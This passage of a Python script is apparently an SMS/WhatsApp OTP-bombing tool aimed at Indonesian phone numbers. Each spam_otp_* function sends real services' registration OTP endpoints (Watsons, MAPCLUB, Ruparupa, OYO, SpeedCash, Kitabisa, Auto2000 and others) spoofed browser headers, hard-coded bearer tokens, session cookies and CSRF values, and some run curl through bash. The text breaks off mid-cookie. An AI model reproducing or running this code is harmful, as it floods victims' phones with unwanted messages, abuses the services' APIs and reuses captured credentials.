                elif data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                else:
                    return False
            except:
                return True
        else:
            return False

    except Exception as e:
        return False

def spam_otp_watsons_kedua(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]

        session = requests.Session()

        headers = {
            'Host': 'api.watsons.co.id',
            'Connection': 'keep-alive',
            'cache-control': 'no-cache, no-store, must-revalidate, post-check=0, pre-check=0',
            'sec-ch-ua-platform': '"Android"',
            'authorization': 'bearer 0Sv-5cyRFTYMcXj-qh92vqC1WQ4',
            'pragma': 'no-cache',
            'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile': '?1',
            'expires': '0',
            'queue-target': 'https://www.watsons.co.id/id/register',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36',
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'vary': '*',
            'origin': 'https://www.watsons.co.id',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.watsons.co.id/',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=1, i'
        }

        otp_payload = {
            "uid": "",
            "action": "REGISTRATION",
            "countryCode": "62",
            "target": nomor,
            "type": "SMS"
        }

        otp_url = 'https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR'

        resp_otp = session.post(otp_url, json=otp_payload, headers=headers, timeout=15)

        if resp_otp.status_code == 200:
            try:
                data = resp_otp.json()
                if data.get('status') == 'success' or data.get('success') == True:
                    return True
                elif data.get('message') and ('otp' in str(data.get('message')).lower() or 'sms' in str(data.get('message')).lower()):
                    return True
                else:
                    return False
            except:
                return True
        else:
            return False

    except Exception as e:
        return False

def spam_otp_mapclub_wa_kedua(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        else:
            nomor = nomor

        token = "eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiIwMWQ3MmY3Yi1mMTY2LTRmM2YtOWZhYi1hMGViNGQ2MjE5YTIiLCJleHBpcmVkIjoxNzgzNTM3MTA4MDMzLCJleHBpcmUiOjM2MDAsImV4cCI6MTc4MzUzNzEwOCwiaWF0IjoxNzgzNTMzNTA4LCJwbGF0Zm9ybSI6IldFQiJ9.AEe4pFBbLiTtQkCBoc4NgFiyzxJmqVs-YjNp0HkW6Xbi14oOo_lRZGOojeF9nngJm6CwmvvGPtTZ34jZxyqzCg"

        url = 'https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=WHATSAPP'

        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'in-ID',
            'authorization': f'Bearer {token}',
            'client-platform': 'WEB',
            'client-timestamp': str(int(time.time() * 1000)),
            'content-type': 'application/json',
            'origin': 'https://www.mapclub.com',
            'referer': 'https://www.mapclub.com/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36'
        }

        payload = {
            "account": nomor,
            "prefix": "62"
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200

    except Exception as e:
        return False

def spam_otp_mapclub_sms(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]

        token = 'eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiJhZmFkMTJlMS04ODk0LTQyOTMtOThkMy1iYmM5M2Y4N2ExZDAiLCJleHBpcmVkIjoxNzgyOTc2NDIxNzE1LCJleHBpcmUiOjM2MDAsImV4cCI6MTc4Mjk3NjQyMSwiaWF0IjoxNzgyOTcyODIxLCJwbGF0Zm9ybSI6IldFQiJ9.1-V0QBbQsXsOxrg7gwaoKzsN-WJIrzb4Qao64pxz50thAZ1m6byXeSbmRjerAkMdMzgdVH7NSknlwfyAXFbB9g'

        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'in-ID',
            'authorization': f'Bearer {token}',
            'client-platform': 'WEB',
            'client-timestamp': str(int(time.time() * 1000)),
            'content-type': 'application/json',
            'origin': 'https://www.mapclub.com',
            'referer': 'https://www.mapclub.com/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36'
        }

        payload = {
            "account": nomor,
            "prefix": "62"
        }

        url = 'https://beryllium.mapclub.com/api/member/registration/sms/otp'
        params = {'channel': 'SMS'}

        response = requests.post(url, headers=headers, json=payload, params=params, timeout=15)
        return response.status_code == 200

    except Exception as e:
        return False

def spam_otp_mapclub_sms_kedua(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        else:
            nomor = nomor

        token = "eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiIwMWQ3MmY3Yi1mMTY2LTRmM2YtOWZhYi1hMGViNGQ2MjE5YTIiLCJleHBpcmVkIjoxNzgzNTM3MTA4MDMzLCJleHBpcmUiOjM2MDAsImV4cCI6MTc4MzUzNzEwOCwiaWF0IjoxNzgzNTMzNTA4LCJwbGF0Zm9ybSI6IldFQiJ9.AEe4pFBbLiTtQkCBoc4NgFiyzxJmqVs-YjNp0HkW6Xbi14oOo_lRZGOojeF9nngJm6CwmvvGPtTZ34jZxyqzCg"

        url = 'https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=SMS'

        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'in-ID',
            'authorization': f'Bearer {token}',
            'client-platform': 'WEB',
            'client-timestamp': str(int(time.time() * 1000)),
            'content-type': 'application/json',
            'origin': 'https://www.mapclub.com',
            'referer': 'https://www.mapclub.com/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36'
        }

        payload = {
            "account": nomor,
            "prefix": "62"
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200

    except Exception as e:
        return False

def spam_otp_ruparupa(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor
        else:
            nomor = '62' + nomor

        # Generate rr-sid
        rr_sid = f"ufiO{int(time.time())}XymEEjG06H"

        url = 'https://wapi.ruparupa.com/klk/manage-otp-request'

        headers = {
            'accept': 'application/json',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjdXN0b21lcl9pZCI6MTQ3NTAwODcsImlhdCI6MTc4MjgxOTA3OSwiaXNzIjoid2FwaS5ydXBhcnVwYSJ9.dccGwwtX4HaSt2W5p_huJ7zTzRiaaZcxdNorNjR6iQo',
            'b2b-type': 'non-b2b',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://www.ruparupa.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.ruparupa.com/',
            'rr-sid': rr_sid,
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'user-platform': 'desktop',
            'x-company-name': 'ruparupa',
            'x-frontend-type': 'desktop'
        }

        payload = {
            "otpRequestType": "verify-phone",
            "action": "onMountOrResend",
            "channel": "WhatsApp",
            "phone": nomor
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200

    except Exception as e:
        return False

def spam_otp_cashenable(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif nomor.startswith('+62'):
            nomor = nomor
        else:
            nomor = '+62' + nomor

        import uuid
        device_id = str(uuid.uuid4())

        url = 'https://api.cashenable.com/authentication/v2/coreauth'

        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache, no-store, must-revalidate, max-age=0',
            'content-type': 'application/json',
            'device_id': device_id,
            'device_name': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'device_type': 'desktop',
            'expires': '0',
            'origin': 'https://desktop.labamu.co.id',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://desktop.labamu.co.id/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'source': 'Desktop',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36'
        }

        payload = {
            "identifier": nomor,
            "auth_method": "whatsapp"
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 201

    except Exception as e:
        return False

def spam_eraspace(phone):
    try:
        import hashlib

        p = normalize_phone(phone)
        if p.startswith('0'):
            msisdn = '62' + p[1:]
        elif p.startswith('62'):
            msisdn = p
        else:
            msisdn = '62' + p

        device_id = str(uuid.uuid4())
        epoch = str(int(time.time()))

        SHA256(device_id|eraspace|epoch)
        signature = hashlib.sha256(f"{device_id}|eraspace|{epoch}".encode()).hexdigest()

        url = "https://jeanne.eraspace.com/customers/v3/otp/request"

        headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "id-ID",
            "Authorization": "Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=",
            "Content-Type": "application/json",
            "Device-id": device_id,
            "Epoch": epoch,
            "Origin": "https://eraspace.com",
            "Otp-Client": "eraspace",
            "Otp-Provider": "whatsapp",
            "Referer": "https://eraspace.com/",
            "Signature": signature,
            "Sms-Client": "eraspace",
            "Source": "eraspace",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
            "Connection": "keep-alive"
        }

        payload = {
            "identifier": msisdn,
            "regionCode": "ID",
            "type": "identifier_validation"
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)

        if 200 <= resp.status_code <= 299:
            try:
                data = resp.json()
                if data.get("message") == "Success Request OTP":
                    return True
                if "data" in data and "identifier" in str(data):
                    return True
            except:
                pass
            return True
        return False
    except:
        return False

def spam_otp_oyorooms(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]

        nomor = ''.join(filter(str.isdigit, nomor))

        if len(nomor) < 10:
            return False

        session = requests.Session()

        cookies = {
            'delta_ver': '1783169391.895.680.781361|30a98be7397e93d8ee905a77f63b5c5a',
            '_csrf': 'z2qem89SAImhv-99mY7Qz43S',
            'acc': 'IN',
            'locale': 'id',
            'X-Location': 'undefined',
            'mab': 'bb752a6c73fad035dc2ea0697579750f',
            'expd': 'mww2%3A1%7Cioab%3A1%7Cmhdp%3A1%7Cbcrp%3A0%7Cpwbs%3A1%7Cslin%3A1%7Chsdm%3A2%7Ccomp%3A0%7Cnrmp%3A1%7Cnhyw%3A1%7Cgcer%3A1%7Crecs%3A1%7Cswhp%3A1%7Clvhm%3A1%7Cgmbr%3A0%7Cyolo%3A1%7Crcta%3A1%7Ccbot%3A1%7Cotpv%3A1%7Ctrtr%3A0%7Clbhw%3A1%7Cndbp%3A0%7Cmapu%3A1%7Cnclc%3A1%7Cdwsl%3A1%7Ceopt%3A1%7Cotpv%3A1%7Cwizi%3A1%7Cmorr%3A1%7Cyopb%3A0%7CTTP%3A1%7Caimw%3A1%7Chdpn%3A0%7Cweb2%3A0%7Cspw1%3A0%7Cstrf%3A1%7Cltvr%3A1%7Cwizz%3A1%7Clpcp%3A1%7Cclhp%3A1%7Cprwt%3A1%7Ccbhd%3A1%7Cins2%3A3%7Cmcal%3A1%7Cmhdc%3A1%7Cmcal%3A1%7Clopo%3A1%7Cptax%3A1%7Ciiat%3A0%7Cpbnb%3A0%7Cror2%3A1%7Cmbwe%3A0%7Cmboe%3A0%7Cctry%3A1%7Cmshd%3A1%7Csovb%3A2%7Cctrm%3A1%7Cofcr%3A1%7Ciupi%3A1%7Cnbi1%3A3%7Crwtg%3A1%7Cstow%3A1%7Cimtg%3A2%7Cptpa%3A1%7Cormp%3A1%7Cpbre%3A0%7Cllat%3A0%7Cesmi%3A0%7Chdam%3A0',
            'appData': '%7B%22userData%22%3A%7B%22isLoggedIn%22%3Afalse%7D%7D',
            'token': 'SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc%3D',
            '_uid': 'Not%20logged%20in',
            'XSRF-TOKEN': 'bYRZoRu5-6fyXF51wSMdrrS0EAYDpphLOsfw',
            'ql': 'true',
            '_gcl_au': '1.1.1098408214.1783169392',
            'isHomepageViewed': 'true',
            'fingerprint2': 'a19e43fe531de889917ff09bd9c00e3b',
            '_ga': 'GA1.2.301009132.1783169392',
            '_gid': 'GA1.2.1435061004.1783169397'
        }

        session.cookies.update(cookies)

        fingerprint = "a19e43fe531de889917ff09bd9c00e3b"
        device_id = fingerprint + "530311"
        sdata = "eyJrdWQiOlsyNDIwMCwxNDUwMCwxMjcwMCwxOTUwMCwxMzkwMCwxNDAwMCwxNDUwMCwxNzAwMCwxMzcwMCwxMzAwMCwxMTkwMF0sImFjYyI6W10sImd5ciI6W10sInR1ZCI6WzE2MDAsMzAyMDAsNDQ5MDAsNDE1NzAwLDMxMTUwMCwyOTY4MDAsMzQ1NDAwLDM5NTcwMCwyOTYyMDAsMjEzODAwLDk2NTAwLDk3NjAwLDExMjEwMCwxNzkyMDAsMTE0NjAwLDE0NjcwMCw5NjQwMCwzMjY0MDAsMzQ0NjAwLDMyODQwMCwzMjgwMDAsMzYwNzAwLDUxMTMwMCw2NDQ0MDAsMzEzNzAwLDI4NzAwLDYxNjAwLDk1MzAwXSwidGlkIjpbNTYzMTAwMCwxNzM2MDIwMCw2MTk4MTAwLDExMzQwMDAsMzA0MjAwLDIwMTkwMCwyMjA5MDAsMjIwNTAwLDE4NjcwMCwxNjkwMDAsNTY4ODAwLDcwMjMwMCw5Njk5MDAsMjg3MDAwLDUzNTAwMCw3MTg3MDAsNjAyODAwLDEyMjE2MDAsMTcxMTAwLDIwNjEwMCwyMjA0MDAsMTg4MzAwLDE3MTMwMCw2NTYwMDAsMzM1NzAwLDM4NjgwMCw4MDIyNzgwMCwxMTc5MzQwMF0sImtpZCI6WzEyNzM5MTEwMCwxOTM1MDAsMjMyMTAwLDIyMjUwMCwyNDU5MDAsMjY5MzAwLDE1MjMwMCwyMzQ2MDAsMTY2NjAwLDIwNDEwMCwxODYyMDBdLCJ0bXYiOltbeyJ4IjoyNDcsInkiOjM2OX0seyJ4IjoyNTUsInkiOjM0Mn0seyJ4IjozMjcsInkiOjE4OX0seyJ4IjozMzUsInkiOjE3Nn1dLFt7IngiOjI1NSwieSI6MzYyfSx7IngiOjI1OSwieSI6MzU0fSx7IngiOjM0NywieSI6MTc4fSx7IngiOjM1MSwieSI6MTcyfV0sW3sieCI6MjQwLCJ5Ijo1MTZ9LHsieCI6MjM4LCJ5Ijo1MjZ9LHsieCI6MjM3LCJ5Ijo1Mzh9LHsieCI6MjM3LCJ5Ijo1NDB9LHsieCI6MjM3LCJ5Ijo1Mzl9XSxbeyJ4IjoyNTUsInkiOjM1MX0seyJ4IjoyNTMsInkiOjM1OX0seyJ4IjoyMzUsInkiOjUwMH0seyJ4IjoyMzUsInkiOjUyNX0seyJ4IjoyMzUsInkiOjUzN31dLFt7IngiOjIwMCwieSI6MzIxfSx7IngiOjIwNSwieSI6MzA3fSx7IngiOjIyMywieSI6MjU2fSx7IngiOjIyMywieSI6MjU2fV1dfQ=="

        headers = {
            'accept': '*/*',
            'accept-language': 'id',
            'content-type': 'application/json',
            'origin': 'https://identity-gateway.oyorooms.com',
            'referer': 'https://identity-gateway.oyorooms.com/login',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36',
            'access_token': 'SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=',
            'deviceid': device_id,
            'fingerprint_hash': fingerprint,
            'loc': '153',
            'sData': sdata,
            'externalHeaders': '[object Object]',
            'XSRF-TOKEN': 'bYRZoRu5-6fyXF51wSMdrrS0EAYDpphLOsfw'
        }

        payload = {
            "phone": nomor,
            "country_code": "+62",
            "nod": 4
        }

        r = session.post('https://identity-gateway.oyorooms.com/api/pwa/generateotp?locale=id',
            json=payload,
            headers=headers,
            timeout=10
        )

        if r.status_code == 200:
            try:
                data = r.json()
                status = data.get('status', '')
                is_user_present = data.get('is_user_present', False)

                if status == "correct" and is_user_present:
                    return True
                elif status == "correct" and not is_user_present:
                    return False
                else:
                    return False
            except:
                return True if r.status_code == 200 else False
        else:
            return False

    except Exception as e:
        return False

def spam_otp_speedcash_sms(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        import subprocess
        import json

        cookie = '_gcl_au=1.1.179635825.1783143670; _tt_enable_cookie=1; _ttp=01KWNTA9MFMPRKVN4403SGAP5F_.tt.2; _gid=GA1.3.23590014.1783143677; page=eyJpdiI6IndNdG9LMWFLcnNQekhqMEhKcFwvb0VnPT0iLCJ2YWx1ZSI6IitCXC8xd2E2MXJlejhYZmxsN2k0ZzhRPT0iLCJtYWMiOiJlYjM2OWViNDA3NTJkNDk0YzExZjBiMDYwZDBkNDY0ZGIwZjgzNGNkMjNhMGMzNmY4ZWNmYWFmYjk1NDdiNWU0In0%3D; ttcsid_BQG0RGGAC2KB0QR0PJOG=1783161126775::fUH_lmHk7dEJSxbUqs_Q.2.1783161197355.1; ttcsid=1783161126780::Ub-TvvCt0eosFi2US8Ta.2.1783161197354.0::1.-2978.0::70607.4.265.339::0.0.0; XSRF-TOKEN=eyJpdiI6IjdaVHpFODVWY0V0b21jYjk4enhcLzFBPT0iLCJ2YWx1ZSI6ImNkcVNNblwvbUlrdXNMck5ndEh6M1J6dGhqTU9YTlF5OFBNN3FNQ3oxK3VIVlFMcGtnUkJSbXBKMEtyRGZONGlEIiwibWFjIjoiZWY0OTUwZDFmYzcxMDA1MDI3ZWI0YzhlNTI2YjQ5ODI1ZTc2YmJhNTkwYTZkOGQ0MzZlNTFiYTg1ZWE0OWMxNSJ9; speedcash_session=eyJpdiI6Inc1V211ZG1VZVhvWHRCREpkNlg5M2c9PSIsInZhbHVlIjoiRlUwaVFmMTZcL1wvQk4rZUhpT28rK2x6MjhGaHl6U3hlVGVJdHdVbWVxWW9LR0RDdXBcL1pMRjl4Y2NvMWZZTHhScCIsIm1hYyI6ImJhMzFmN2I0MzgxNjkyZmE0MDVhZTIyMmY0YTdkNGU2MDhmYmQyYjQyYjA2MTQzYWRiODBiNTRiNGU4ZGRlZDkifQ%3D%3D; _ga_K62HPWSYN0=GS2.1.s1783161125$o2$g1$t1783161200$j58$l0$h0; _ga_YYBXGTQ7Y7=GS2.1.s1783161125$o2$g1$t1783161200$j58$l0$h0; _ga_36YJ2HBQBW=GS2.1.s1783161125$o2$g1$t1783161200$j58$l0$h0; _ga_L47B4F33R0=GS2.1.s1783161125$o2$g1$t1783161200$j58$l0$h885576571; _ga=GA1.3.1971373087.1783143671; x-csrf-token=b7001f72363a50f6976f8ad85bbfe8cab97b1a131a3be8c0ab0225ef069f10e1903ab21033744f14a28dcb8df03346eb685a0b46ca2a6000cf649e29b2ad7b5a%7C3e19bf11f091623f6a3a179f6bd95740c64fdeca0cb7ed897449c093e7e888c4; _gat_UA-62117787-3=1'

        xsrf = 'eyJpdiI6IjdaVHpFODVWY0V0b21jYjk4enhcLzFBPT0iLCJ2YWx1ZSI6ImNkcVNNblwvbUlrdXNMck5ndEh6M1J6dGhqTU9YTlF5OFBNN3FNQ3oxK3VIVlFMcGtnUkJSbXBKMEtyRGZONGlEIiwibWFjIjoiZWY0OTUwZDFmYzcxMDA1MDI3ZWI0YzhlNTI2YjQ5ODI1ZTc2YmJhNTkwYTZkOGQ0MzZlNTFiYTg1ZWE0OWMxNSJ9'

        csrf = 'b7001f72363a50f6976f8ad85bbfe8cab97b1a131a3be8c0ab0225ef069f10e1903ab21033744f14a28dcb8df03346eb685a0b46ca2a6000cf649e29b2ad7b5a'

        payload = json.dumps({
            "version_name": "3.2.0",
            "version_code": "270",
            "uuid": "0489f8f6-49cd-5a10-9fae-7e1297fdd015",
            "user_uuid": "0489f8f6-49cd-5a10-9fae-7e1297fdd015",
            "via": "BB MOBILE WEB",
            "app_id": "SPEEDCASH",
            "appid": "SPEEDCASH",
            "location": "0,0",
            "phone": phone,
            "state": "REGISTER",
            "type": "SMS"
        })

        curl_otp = f'''curl -s -X POST 'https://member.speedcash.co.id/api/twice/otp/generate' \\
  -H 'authorization: Bearer YzZmNDM2YzliYjVkMDE1Y2I4MDhmYjFlMjY5NDA3MTgwYmEzMWQ1NmNjZjNmMzQ1Yjc2NTM1MDIyZTFlMDUwY2ZmMTY5MzVmZTMyZjIyOTM2ZmNmZjZhZmM4MDRhNjM2' \\
  -H 'content-type: application/json' \\
  -H 'cookie: {cookie}' \\
  -H 'origin: https://member.speedcash.co.id' \\
  -H 'referer: https://member.speedcash.co.id/' \\
  -H 'x-csrf-token: {csrf}' \\
  -H 'x-xsrf-token: {xsrf}' \\
  -d '{payload}' '''

        result = subprocess.run(['bash', '-c', curl_otp], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                return data.get('rc') == '00'
            except:
                return False
        return False

    except Exception as e:
        return False

def spam_otp_kitabisa_wea(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]

        import subprocess
        import json

        payload = json.dumps({
            "full_name": "Fahri reza",
            "username": nomor,
            "otp_type": "whatsapp"
        })

        curl_command = f'''curl -s -X POST 'https://gate.kitabisa.com/wong/register/draft' \\
  -H 'accept: application/json' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'content-type: application/json' \\
  -H 'origin: https://accounts.kitabisa.com' \\
  -H 'referer: https://accounts.kitabisa.com/' \\
  -H 'sec-ch-ua: "Chromium";v="107", "Not=A?Brand";v="24"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-site: same-site' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36' \\
  -H 'version: 3.4.0' \\
  -H 'x-ktbs-api-version: 1.0.0' \\
  -H 'x-ktbs-client-name: kanvas' \\
  -H 'x-ktbs-client-version: 1.0.0' \\
  -H 'x-ktbs-platform-name: kanvas' \\
  -H 'x-ktbs-request-id: 1c3f6c98-2007-4124-933a-946348406887' \\
  -H 'x-ktbs-signature: cf6bb271fda15fb3083a336e71b27db7d3e6b410a2026d7e377f1cd5cdb83645' \\
  -H 'x-ktbs-time: 1782837706' \\
  -d '{payload}' '''

        result = subprocess.run(['bash', '-c', curl_command], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                return data.get('response_code') == '000000'
            except:
                return False
        return False

    except Exception as e:
        return False

def spam_otp_auto2000(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        url = 'https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp'

        headers = {
            'Host': 'auto2000.co.id',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile': '?1',
            'baggage': 'sentry-environment=PRD,sentry-public_key=a9168ed9e0239b8f02f772e5cb953cbf,sentry-trace_id=7d8e539a8fb54552a1cc3aac6fb1404d,sentry-transaction=%2Flogin,sentry-sampled=true,sentry-sample_rand=0.21923493905699087,sentry-sample_rate=1',
            'sentry-trace': '7d8e539a8fb54552a1cc3aac6fb1404d-88ab5675ac537dca-1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Origin': 'https://auto2000.co.id',
            'Referer': 'https://auto2000.co.id/login',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cookie': 'UU_PDP_CHECKBOX_CONTENT=PHA+U2F5YSBzZXR1anUgdW50dWsgbWVuZXJpbWEgcHJvZ3JhbSBwcm9tb3NpIGRhbiBsYXlhbmFuIGRhcmkgQXV0bzIwMDAgc2VzdWFpIGRlbmdhbiA8c3BhbiBzdHlsZT0iY29sb3I6cmdiKDAsIDEwMiwgMjA0KSI+PHNwYW4gaWQ9InN5YXJhdC1rZXRlbnR1YW4iIHN0eWxlPSJjb2xvcjpyZ2IoMCwgMTAyLCAyMDQpO2N1cnNvcjpwb2ludGVyIj5TeWFyYXQgZGFuIEtldGVudHVhbjwvc3Bhbj48L3NwYW4+PHNwYW4+IGRhbiA8L3NwYW4+PHNwYW4gaWQ9InBlbWJlcml0YWh1YW4tcHJpdmFzaSIgc3R5bGU9ImNvbG9yOnJnYigwLCAxMDIsIDIwNCk7Y3Vyc29yOnBvaW50ZXIiPlBlbWJlcml0YWh1YW4gUHJpdmFzaTwvc3Bhbj4geWFuZyBiZXJsYWt1LjwvcD4%3D; UU_PDP_POPUP_CONTENT=PHA+PHN0cm9uZz5TYWxhbSBBdXRvRmFtaWx5IEJhcGFrL0lidSB7Y3VzdG9tZXJOYW1lfSE8L3N0cm9uZz48L3A+PHA+PGJyIC8+PC9wPjxwPlRlcmltYSBrYXNpaCB0ZWxhaCBtZW1pbGloIEF1dG8yMDAwLiBLbGlrIOKAnFNldHVqdeKAnSB1bnR1ayBwZW5nYWxhbWFuIG9wdGltYWwgJmFtcDsgcGVyc29uYWxpc2FzaSBsYXlhbmFuIHNlc3VhaSBkZW5nYW4gPHNwYW4gaWQ9InN5YXJhdC1rZXRlbnR1YW4iIHN0eWxlPSJjb2xvcjpyZ2IoMCwgMTAyLCAyMDQpO2N1cnNvcjpwb2ludGVyIj5TeWFyYXQgZGFuIEtldGVudHVhbjwvc3Bhbj4gJmFtcDsgPHNwYW4gaWQ9InBlbWJlcml0YWh1YW4tcHJpdmFzaSIgc3R5bGU9ImNvbG9yOnJnYigwLCAxMDIsIDIwNCk7Y3Vyc29yOnBvaW50ZXIiPlBlbWJlcml0YWh1YW4gUHJpdmFzaTwvc3Bhbj4uPC9wPg%3D%3D; __gcl_au=1.1.1768235826.1784098499; _ga=GA1.1.195703634.1784098502; _fbp=fb.2.1784098503407.212865537130129769; _tt_enable_cookie=1; _ttp=01KXJ8XFB6NA5CZT43HK9H4DC3_.tt.2; 